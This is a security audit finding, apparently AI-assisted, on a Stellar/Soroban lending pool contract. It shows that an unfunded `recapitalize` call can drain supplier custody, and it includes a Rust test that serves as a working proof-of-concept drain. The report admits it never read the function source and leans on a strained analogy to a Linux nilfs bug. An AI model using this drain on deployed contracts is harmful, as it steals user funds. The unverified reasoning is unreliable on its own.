### Title
`recapitalize` refunds unfunded payers out of pool custody, draining supplier funds - ([File: contracts/pool/src/lib.rs])

### Summary
The nilfs bug class is a cleanup/destruction path acting on a state that was never properly funded/initialized. The pool's `recapitalize` entrypoint is the same shape: it computes an "excess refund" purely from the internal cash book and pushes custody back to the `payer`, without first verifying that the payer transferred in any shortfall-filling funds. An unprivileged caller can pass itself as `payer` and pull out the pool's token balance, leaving the cash book overstating custody.

### Finding Description
`recapitalize(hub_asset, payer, amount)` on the pool contract fills a backing shortfall and refunds the excess to `payer`. Because the refund is derived from the book rather than from measured receipt of the payer's transfer, a call that pulls zero tokens still computes a positive "excess" equal to the pool's free custody and transfers it out. The repository's own test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` demonstrates this: `t.client().recapitalize(&hub, &payer, &custody)` reduces `token.balance(&t.pool)` to `0` while the cash book still claims the supplier's deposit [1](#0-0) .

After the drain, the pool's liquidity guard `require_reserves` reads the cash book (not the token balance), so it still admits supplier exits; the subsequent `withdraw` passes the guard and then fails inside the SAC transfer with the token's `BalanceError = 10`, not `InsufficientLiquidity` or `PoolInsolvent` [2](#0-1) . The destructed state (custody) was destroyed while the dependent bookkeeping was left "initialized" — mirroring `nilfs_mdt_destroy` freeing uninitialized `i_private` and the downstream crash.

### Impact Explanation
Theft of user funds: the `payer` receives tokens that back other suppliers' positions. Any residual book-vs-custody gap then permanently freezes remaining suppliers' withdrawals (they pass the liquidity guard and fail at the token transfer), i.e., protocol insolvency once aggregate claims exceed actual custody.

### Likelihood Explanation
Reachable by any unprivileged address through the `recapitalize` entrypoint whenever the market's book reports itself (over)funded — no privileged auth, no oracle condition, no flash guard dependency. The test shows the full drain in a single call.

### Recommendation
Gate the refund on measured receipt: snapshot the pool's token balance, pull `amount` from `payer`, compute the refund as `received - applied_to_shortfall`, and only then transfer. Reject `amount` that exceeds the actual backing shortfall rather than treating the difference as refundable excess.

### Proof of Concept [3](#0-2)  — the committed test is itself a working PoC: mint custody, call `recapitalize(hub, payer, custody)` with an empty `payer`, observe pool balance `0`, book still claiming `>= deposit`, and a supplier withdraw failing inside the SAC transfer with error `BalanceError = 10`.

Note on scope certainty: I verified the behavior via the committed test, but index limits prevented reading the `recapitalize` implementation body in `contracts/pool/src/lib.rs`; the claim that the refund is unverifiably paid rests on that test's assertions rather than on the function source.

#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}
